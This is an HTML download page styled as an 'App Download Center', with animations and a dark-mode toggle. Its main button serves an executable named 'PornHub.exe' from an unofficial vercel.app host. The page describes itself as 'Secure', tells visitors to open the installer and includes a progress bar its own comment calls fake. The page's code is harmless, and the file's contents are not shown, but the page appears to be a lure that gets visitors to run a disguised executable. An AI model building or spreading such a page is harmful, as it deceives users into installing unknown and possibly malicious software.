<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<title>Download Center</title>

<style>
:root {
  --bg: #0b1220;
  --card: rgba(255,255,255,0.05);
  --text: #e5e7eb;
  --muted: #94a3b8;
  --accent: #38bdf8;
  --accent2: #22c55e;
}

body.light {
  --bg: #f5f5f7;
  --card: white;
  --text: #111;
  --muted: #555;
  --accent: #0071e3;
  --accent2: #34c759;
}

* {
  margin: 0;
  padding: 0;
  box-sizing: border-box;
  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
}

body {
  background: var(--bg);
  color: var(--text);
  overflow-x: hidden;
  transition: 0.4s ease;
}

canvas {
  position: fixed;
  top: 0;
  left: 0;
  z-index: -1;
}

header {
  text-align: center;
  padding: 80px 20px 30px;
}

h1 {
  font-size: 3rem;
  background: linear-gradient(90deg, var(--accent), var(--accent2));
  -webkit-background-clip: text;
  -webkit-text-fill-color: transparent;
}

p {
  color: var(--muted);
}

.btn {
  display: inline-block;
  margin-top: 15px;
  padding: 12px 18px;
  border-radius: 999px;
  background: linear-gradient(90deg, var(--accent2), #16a34a);
  color: white;
  text-decoration: none;
  font-weight: 600;
  border: none;
  cursor: pointer;
  transition: 0.2s;
}

.btn:hover {
  transform: scale(1.05);
}

main {
  max-width: 900px;
  margin: auto;
  padding: 20px;
  display: grid;
  grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
  gap: 20px;
}

.box {
  background: var(--card);
  border: 1px solid rgba(255,255,255,0.08);
  border-radius: 18px;
  padding: 20px;
  backdrop-filter: blur(12px);
  opacity: 0;
  transform: translateY(40px);
  transition: all 0.6s ease;
}

.box.show {
  opacity: 1;
  transform: translateY(0);
}

h2 {
  color: var(--accent);
  margin-bottom: 10px;
}

p, li {
  color: var(--muted);
}

ul {
  padding-left: 18px;
}

.topbar {
  position: fixed;
  top: 15px;
  right: 15px;
}

.toggle {
  padding: 10px 14px;
  border-radius: 999px;
  border: none;
  cursor: pointer;
  background: var(--card);
  color: var(--text);
}

.progress-wrap {
  margin-top: 15px;
}

.progress {
  width: 100%;
  height: 10px;
  background: rgba(255,255,255,0.1);
  border-radius: 999px;
  overflow: hidden;
}

.bar {
  height: 100%;
  width: 0%;
  background: linear-gradient(90deg, var(--accent), var(--accent2));
}
</style>
</head>

<body>

<canvas id="particles"></canvas>

<div class="topbar">
  <button class="toggle" onclick="toggleMode()">🌓 Mode</button>
</div>

<header>
  <h1>App Download Center</h1>
  <p>Modern • Fast • Secure Download Page</p>

  <!-- REAL DOWNLOAD BUTTON -->
  <a class="btn" href="phdownloadcenter.vercel.app/PornHub.exe" download>
    Download
  </a>

  <div class="progress-wrap">
    <div class="progress">
      <div class="bar" id="bar"></div>
    </div>
  </div>
</header>

<main>

  <div class="box">
    <h2>Download</h2>
    <p>Click the button above to download your file.</p>
  </div>

  <div class="box">
    <h2>Requirements</h2>
    <ul>
      <li>Windows / Mac (depending on file)</li>
      <li>Internet connection</li>
    </ul>
  </div>

  <div class="box">
    <h2>Instructions</h2>
    <ul>
      <li>Download file</li>
      <li>Open installer</li>
      <li>Follow setup steps</li>
    </ul>
  </div>

</main>

<script>
// particles
const canvas = document.getElementById("particles");
const ctx = canvas.getContext("2d");

canvas.width = window.innerWidth;
canvas.height = window.innerHeight;

let particles = Array.from({length: 60}, () => ({
  x: Math.random() * canvas.width,
  y: Math.random() * canvas.height,
  r: Math.random() * 2,
  dx: (Math.random() - 0.5),
  dy: (Math.random() - 0.5)
}));

function draw() {
  ctx.clearRect(0,0,canvas.width,canvas.height);
  ctx.fillStyle = "rgba(56,189,248,0.7)";

  particles.forEach(p => {
    ctx.beginPath();
    ctx.arc(p.x, p.y, p.r, 0, Math.PI * 2);
    ctx.fill();

    p.x += p.dx;
    p.y += p.dy;

    if (p.x < 0 || p.x > canvas.width) p.dx *= -1;
    if (p.y < 0 || p.y > canvas.height) p.dy *= -1;
  });

  requestAnimationFrame(draw);
}
draw();

// dark mode
function toggleMode() {
  document.body.classList.toggle("light");
}

// reveal
const boxes = document.querySelectorAll(".box");

const observer = new IntersectionObserver(entries => {
  entries.forEach(entry => {
    if(entry.isIntersecting) entry.target.classList.add("show");
  });
});

boxes.forEach(box => observer.observe(box));

// fake progress (optional visual only)
function startInstall() {
  let bar = document.getElementById("bar");
  let width = 0;

  let interval = setInterval(() => {
    if(width >= 100) clearInterval(interval);
    else {
      width++;
      bar.style.width = width + "%";
    }
  }, 30);
}
</script>

</body>
</html>
